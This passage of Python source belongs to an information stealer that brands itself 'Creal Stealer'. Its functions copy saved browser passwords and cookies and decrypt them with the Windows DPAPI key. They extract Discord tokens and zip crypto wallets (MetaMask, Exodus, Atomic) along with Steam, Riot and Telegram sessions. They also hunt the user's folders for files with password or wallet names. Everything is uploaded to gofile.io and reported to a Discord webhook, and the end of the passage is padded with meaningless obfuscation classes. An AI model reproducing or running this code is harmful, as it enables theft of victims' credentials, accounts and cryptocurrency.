    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

class bIHarTQBsotyoJid:
    def __init__(self):
        self.__doBypxkSjXYbUjVAaQ()
        self.__SAghlIbBJ()
        self.__HJCboJOiBgoFNWnF()
        self.__ByeJfRIVag()
        self.__euhcwQBzNRz()
        self.__hfsOeLynIDZjiVcxwEF()
        self.__thdkdLcs()
        self.__fkCgwNzdNePTdCvp()
        self.__dJiEmluSPbysEg()
    def __doBypxkSjXYbUjVAaQ(self, rgewQj):
        return self.__thdkdLcs()
    def __SAghlIbBJ(self, EtqTtjVjEY, UsNytkTIDvM, XweHXuMWFvS, SlbZgnfdhxszCbCcAVI, WmMTOiljqZuTkDPHLAe):
        return self.__HJCboJOiBgoFNWnF()
    def __HJCboJOiBgoFNWnF(self, XtFeHNrVUSfzFtvQBzB, YWNdNcSLcEOVhzPWpMB):
        return self.__hfsOeLynIDZjiVcxwEF()
    def __ByeJfRIVag(self, UIRGNIBRPjeJpLh, yMfPmGTCCxlLQbpm, SzuqROFnr, ENgaCJXobxLnBfOoihfE, SFumqPLxpJpSRE, qFlnnzIpaXH, qGPshuRlrboR):
        return self.__thdkdLcs()
    def __euhcwQBzNRz(self, raAeNHpmNkslOgX):
        return self.__euhcwQBzNRz()
    def __hfsOeLynIDZjiVcxwEF(self, ZyLsDyAjFLWq):
        return self.__dJiEmluSPbysEg()
    def __thdkdLcs(self, xPzorLWEwZm, UQZWz, iajkYKZMJFZUr, gsDQqlUOEB):
        return self.__ByeJfRIVag()
    def __fkCgwNzdNePTdCvp(self, LhpgKfyIdSjxEYtNlzHh, IlLydSMOEGkEqDqFpnJV, gfxJgaoiiAb):
        return self.__doBypxkSjXYbUjVAaQ()
    def __dJiEmluSPbysEg(self, asiGDdiIXayLSGN, BMwEfToGFFvt, tFPWXRpaXbLTT, SFucgartw):
        return self.__dJiEmluSPbysEg()
class GFvkjXxRJ:
    def __init__(self):
        self.__eZKPjJqA()
        self.__HHULOWNT()
        self.__FLpHgxLoqEBphujM()
        self.__PpKTdwWGvi()
        self.__CJwstncbnrnqj()
        self.__YZHIRKZnIz()
        self.__seTaXNgmIzdKPxzajKs()
        self.__ggQnBcYQVMazqSg()
        self.__IoCJfmjPvNRpZVIQopm()
        self.__LJWCbravbJXFjXXiYktu()
        self.__xQiTBruRIoz()
        self.__bbvITTuYkcaKxEW()
        self.__pyIOEldzIDmhPTRvJe()
        self.__mEXbGFUS()
        self.__SWbMgQcqUc()
    def __eZKPjJqA(self, xIcBJalvSfsjw, PaXcWCuhlJqQlgMaq):
        return self.__xQiTBruRIoz()
    def __HHULOWNT(self, LspWlJIcpC, AtrodUSytF, OLwHKfbUtcaLlXNe):
        return self.__CJwstncbnrnqj()
    def __FLpHgxLoqEBphujM(self, bJQaOZOUYRGLTWXKTJm, hrEck, ukyuvu, YzbVL, leYeWYae):
        return self.__ggQnBcYQVMazqSg()
    def __PpKTdwWGvi(self, HuDxxuIgozzLNZnIDMob, FXhCvesBMgKdFhrTht, uwejmZrnBbIJy, OgBaERwTYYM, ZVxyUshDgITs, tSuEv, XnAVfCqAJOTOJNTzAu):
        return self.__YZHIRKZnIz()
    def __CJwstncbnrnqj(self, pfRRJeUMZ, qdwyZOwzUkvHwaVnSQ, EvZjKjEiv, AZHHoapiHyelSva, qUkDTld):
        return self.__mEXbGFUS()
    def __YZHIRKZnIz(self, WePHkquGHGcpnYzac, dMEaZUMaMhHnSZnA, VLfCY, hRODnPExGOFBzQwoKxwt, XcCbQQxT, PfTdQOYDwx):
        return self.__SWbMgQcqUc()
    def __seTaXNgmIzdKPxzajKs(self, PEmFNQFkTE, ECWzuSfTvKXH):
        return self.__pyIOEldzIDmhPTRvJe()
    def __ggQnBcYQVMazqSg(self, CaITNvDbTPh, AqfKyIQzRbpIJ, jTXzQb, SRyhc, NsovUAzQZgWFk, pBoPlfzPCIMLnXHkW):
        return self.__mEXbGFUS()
    def __IoCJfmjPvNRpZVIQopm(self, iZaFTUMPawmpucfX, wmoXfzVoYzUzLr):
        return self.__PpKTdwWGvi()
    def __LJWCbravbJXFjXXiYktu(self, VKemSjxFOeSlMGbqlvGH, ruiKDMHD, FKGFm, zqSZuKvcYYZGltNhL, NznlEdJ, OqhrHeem):
        return self.__bbvITTuYkcaKxEW()
    def __xQiTBruRIoz(self, teNtEAi, ZHQibfQeDESPzMfeL, GCqCuuuyGAsAqJvGNl, inXDbmvnjySdRRb, UnpOGRKXbqtJe):
        return self.__CJwstncbnrnqj()
    def __bbvITTuYkcaKxEW(self, JHwNieUCDRZnXX, ChgXXEdhNttCsINupl, GnUYCmeTBNnFSjbdPEc, FBFgLwQ, KuCdSZGdMPfvBab, itbcoMsunkkP, jlYXzEyzzNIcIoDMHRXh):
        return self.__YZHIRKZnIz()
    def __pyIOEldzIDmhPTRvJe(self, LQwNZcDPMTjzxIlcfzVT, XVcYysnLvLotklOd, MTXCh, YyvGVzop, icjUZIijLw, mQQpcVEN):
        return self.__SWbMgQcqUc()
    def __mEXbGFUS(self, fRRPZicB, ldhnOjGCsOzQU, sHQRdfHRO, tVVJecBrn):
        return self.__pyIOEldzIDmhPTRvJe()
    def __SWbMgQcqUc(self, fzyTfYiQOyANZHjd, PoXPrpxSXvKppnwoNmmA, zoeWiHl, oteRqSuwTD):
        return self.__pyIOEldzIDmhPTRvJe()

class QWYyVwbSzMLGPlt:
    def __init__(self):
        self.__hQvEUkEARLgjaxIBD()
        self.__mVjVQhqymxx()
        self.__NiAlRaJJTfYXQ()
        self.__mbrhUmQAoX()
        self.__DtQxalgxMDbLwGDMC()
        self.__sDNmeqRKLesIj()
        self.__WoXedwYUTA()
        self.__IXXUiEUrnlWeOab()
        self.__HPWSAwpSPIbmZUbsiVM()
        self.__QxPNlnNmutshVHLUH()
        self.__OiKvZYpgpgcIM()
        self.__FcCtncQWFgtGakrmp()
    def __hQvEUkEARLgjaxIBD(self, rgUFlNcqmHusrvwOXkV, RfuHKhGstFTZH, dzUNsLNSoqtLgIFhjXu, UCpRVpjZ, tSTyqGMV, pEwEoxlo, FSFcJz):
        return self.__FcCtncQWFgtGakrmp()
    def __mVjVQhqymxx(self, GbyDl, jfmcxHbpzmt, HbXpkxrkFHm):
        return self.__DtQxalgxMDbLwGDMC()
    def __NiAlRaJJTfYXQ(self, gOiCnPES, oZghMFFx, vnHpbZXMkezTq, WNRplDTMaClDQPcVrcqm, FiFsX):
        return self.__NiAlRaJJTfYXQ()
    def __mbrhUmQAoX(self, uzMugSgWhbdc):
        return self.__mVjVQhqymxx()
    def __DtQxalgxMDbLwGDMC(self, CpwpZ, xsBMhRbiN, IYFXIpiQjwdOCHJN, PZEhgehEJ, mbvckMNoyhN, VRBeVDGyqRNvFsyI, pEzrHzQndzw):
        return self.__HPWSAwpSPIbmZUbsiVM()
    def __sDNmeqRKLesIj(self, zVHwTYqhAiHszswj, HBMbhtIUNngxfzUp, mLNDymTeO):
        return self.__hQvEUkEARLgjaxIBD()
    def __WoXedwYUTA(self, CTdIvwevsWo, NtihmQVvUqkqZn, vzuxtyb, yhFtG, JPCwU, nmuXRkvO):
        return self.__mbrhUmQAoX()
    def __IXXUiEUrnlWeOab(self, lKpEQAejHw, aMSqVLLPTVV, nvxcnimqHVlpoq, QFuIIJIgNhxP, CqVGKwFzKbkmNffsOwub):
        return self.__hQvEUkEARLgjaxIBD()
    def __HPWSAwpSPIbmZUbsiVM(self, BTdnWutzXOsl, yoUDVmMGt, eXCxqNDvUrUtROWGRfl, guEnusiX, wttclXbgxjZUXtwRUy, mhwFyAWFucFTWhzQ):
        return self.__sDNmeqRKLesIj()
    def __QxPNlnNmutshVHLUH(self, SiXFSjINlEmzews, PNfGvFckXAynrm):
        return self.__mVjVQhqymxx()
    def __OiKvZYpgpgcIM(self, QQSzELPsfbnhi, yIZxwARVXpmXvAv, kUCPqGRdHPq, ntqrhXrnjqR, rAfWerDEJmo, KSogLITeHDleC, SmsjbSnIVBfRKCaafqc):
        return self.__OiKvZYpgpgcIM()
    def __FcCtncQWFgtGakrmp(self, iiTrkVzRDgXb, GFusSPvjMwccPemIMu, CHBEOExHzhJPjn, SZrmOklOYfVnmOwyWd, PFTAvpYRQrudUOzU, QjzleKhdP):
        return self.__WoXedwYUTA()
class xrrHWykJNxT:
    def __init__(self):
        self.__WHgwmPNbjDj()
        self.__NDyAmjUaimsPM()
        self.__eGzyUCOY()
        self.__wfGsGKcwPCrOOJCOpQ()
        self.__unXJGrwOIMFISW()
        self.__KfhHXxXGibDk()
        self.__KfiDleqanClFsyx()
        self.__OMFUWhaEGgPn()
    def __WHgwmPNbjDj(self, zVzVKpttiQnukoEHVJ, CjhDrMzNeRQjwLDSpfTr, SJkGlQJLYYMBWElOJHoA, fiVByqvnVfqE, zmiARPhzQSxXeCdvbN, CjjkCcRBjVZrb, NeiehCKAmAzHyk):
        return self.__unXJGrwOIMFISW()
    def __NDyAmjUaimsPM(self, GJezPbSAsSp, TtnFzHiskImNy, MMGnLmUdOrva, LZypa, rWDvEKXJwJy, oqyyyLvQKWhKyf):
        return self.__WHgwmPNbjDj()
    def __eGzyUCOY(self, MyxkbnTnUsTtVTnDB):
        return self.__OMFUWhaEGgPn()
    def __wfGsGKcwPCrOOJCOpQ(self, GseKrZAnCDHdPl, KIHKTQEgQATXsdtlLHl, weBFWoBEZKexn, ZboQWqM):
        return self.__wfGsGKcwPCrOOJCOpQ()
    def __unXJGrwOIMFISW(self, BgIErfPscsMbgmoRb, AXJIQsSA, jCQcgs, AeXYPzowCEPyO, DKBOSh, FxMsBgMDdCYkdFjO):
        return self.__eGzyUCOY()
    def __KfhHXxXGibDk(self, ujUwkkJwy, wKMoBKvSvdst, rBvKLDcqEFHWLpUF, PLKbqv, RdXXXfEwFIIRikuIGSb, zRdkHmnWlRUr):
        return self.__KfiDleqanClFsyx()
    def __KfiDleqanClFsyx(self, ADbQogEcu, BYbGflt, RECUFnWlnbdv, zWEBUkVyCe, oWthqEsanPaKItEhKjw, jwrrioTLszjD):
        return self.__KfhHXxXGibDk()
    def __OMFUWhaEGgPn(self, zqFzCIPYTQqaktEVp, TPFYBbbRMzJaZIPgy, maZsRgRPJS, bnDYygqfLPFDpV, WBMeyintdMFI, UzWaRWLNhZjZoJqc):
        return self.__eGzyUCOY()
class WNOFSWmPuaH:
    def __init__(self):
        self.__BeymcNletcIqCLj()
        self.__bQnZfRrz()
        self.__PIMUvirF()
        self.__CGcITcWRzueLuVhEyVOu()
        self.__OyWmEWzxxkvHhACkH()
        self.__ciuRErdWub()
        self.__FLyZJAXzlDCZHFNr()
    def __BeymcNletcIqCLj(self, tptSTdNc, gqgxHPaI, EvVhKtHoOWPXoa):
        return self.__FLyZJAXzlDCZHFNr()
    def __bQnZfRrz(self, xoNfERKZzNl, InXuF, yHybbTQREIMOoTs):
        return self.__CGcITcWRzueLuVhEyVOu()
    def __PIMUvirF(self, TisHImEmi, bJzolyidJezNTfuqMK, ImZOtfjSxGpSfg, ZKLvegJZNVCFYHiyhxGi, HhMfFTGrSdxCeZC, xbsraTlXJnSIWpGAYg, RLrmlyAofx):
        return self.__FLyZJAXzlDCZHFNr()
    def __CGcITcWRzueLuVhEyVOu(self, KyqGsNuBnEOiS, rQuAIcTi, IsOFsIg, aRQVauhSNQyUo, HyCJMYXHnCvLCBywCdx, qrvAVyVHARWmWJcIg):
        return self.__ciuRErdWub()
    def __OyWmEWzxxkvHhACkH(self, VbKqln, zRuIwOjasafFnSMpsvDT, qKmpiivEh, aLRrJ, fPfYalMNqjjosWg, GusoYfCkzjYNFuskRz):
        return self.__bQnZfRrz()
    def __ciuRErdWub(self, JqvvPJGwtvbOaXJeXk, vbtbeZOTaGi, kQOdkLzGNPxSr, rWqQHZvVtSFhZpcrFbcA, LnRERWJfTGaUIyrbzPw, uCltCOZdK):
        return self.__bQnZfRrz()
    def __FLyZJAXzlDCZHFNr(self, sqFicImmYGOieswzi, HTrXEjO, NxDIgMiEsSDT, zXuqsUJahhfOcuCFU, LWtZUjU, aRTjhzRA):
        return self.__bQnZfRrz()

class epIQjpKdaIhkFg:
    def __init__(self):
        self.__QjrgsqRXLiGYr()
        self.__FusajHvZkPSkrUFcQmm()
        self.__kORkvuYVOnjYKD()
        self.__kRrmWNNJuNQ()
        self.__PDVBpyYvXPUAENoaOROP()
        self.__GLQoGxtAOYLjYDyQp()
        self.__rghBZbor()
        self.__jzTYjEkIF()
        self.__DtMlQsAESoe()
        self.__ilAymVJLAJ()
        self.__EFohCIvENsTbjILV()
        self.__xhezHqUjHvFRJyqGnk()
        self.__itRnBGyUgqRgsVuz()
        self.__PQAatHRmpgmr()
    def __QjrgsqRXLiGYr(self, mQZRviqnjItjwptDyXiT, gmyquuKZoxCwx, SetLQBQypuASKivtgtiS):
        return self.__ilAymVJLAJ()
    def __FusajHvZkPSkrUFcQmm(self, diYcUEbnqZ, GbqeqYIO, NFPnloPXSx):
        return self.__PDVBpyYvXPUAENoaOROP()
    def __kORkvuYVOnjYKD(self, wzYNQa, xJkLwEwveCmNlPgxqxk, BbLuqHpNZDwJD, nQHEonGplBidKZQ):
        return self.__FusajHvZkPSkrUFcQmm()
    def __kRrmWNNJuNQ(self, vzdOb, zIfbXCRTGOzzOkqaHE, cvdMCwIkAqiU):
        return self.__rghBZbor()
    def __PDVBpyYvXPUAENoaOROP(self, BDUfaNgOtFcdmcdalH, IvwFlSPqgKIHHZJocJDi):
        return self.__kORkvuYVOnjYKD()
    def __GLQoGxtAOYLjYDyQp(self, rByrkuEX, HBUVsmytQy, CPPEfdLMhwSfIDR, kZHiBleN, iTsXNjMbVbLsLbxRpqgw):
        return self.__PDVBpyYvXPUAENoaOROP()
    def __rghBZbor(self, yZURUpfWlPxoCMD, BLwOZdHMXbrinC, mLBsjxfJTkA, CfKdgCf, RrKBo, JQvrnW):
        return self.__kRrmWNNJuNQ()
    def __jzTYjEkIF(self, DjyJhbVCLZYnjrVR):
        return self.__PQAatHRmpgmr()
    def __DtMlQsAESoe(self, qDIpfpUXUehSefP, paUWYsmI, dHjwWpF, cecKqphcZDIqHHq, MjQlkIvuOzuqGmh):
        return self.__EFohCIvENsTbjILV()
    def __ilAymVJLAJ(self, BBDjqxXKNDn, tmuJbnPPGxTKgLXg):
        return self.__itRnBGyUgqRgsVuz()
    def __EFohCIvENsTbjILV(self, SUkzhiyhYnBJLc, xIdIdipIUhNKPYxQEjXN, eUOEReqAIsKnkOqohdi, sraeWNatKJO, DqbzpdGdCZC):
        return self.__kRrmWNNJuNQ()
    def __xhezHqUjHvFRJyqGnk(self, Wievhgl, AtAtpvkBaXVegIlnMoM, NARtSf, PdpEPku, LdBItQied, nMhRfreuCuJxXKZIj, wzEoW):
        return self.__jzTYjEkIF()
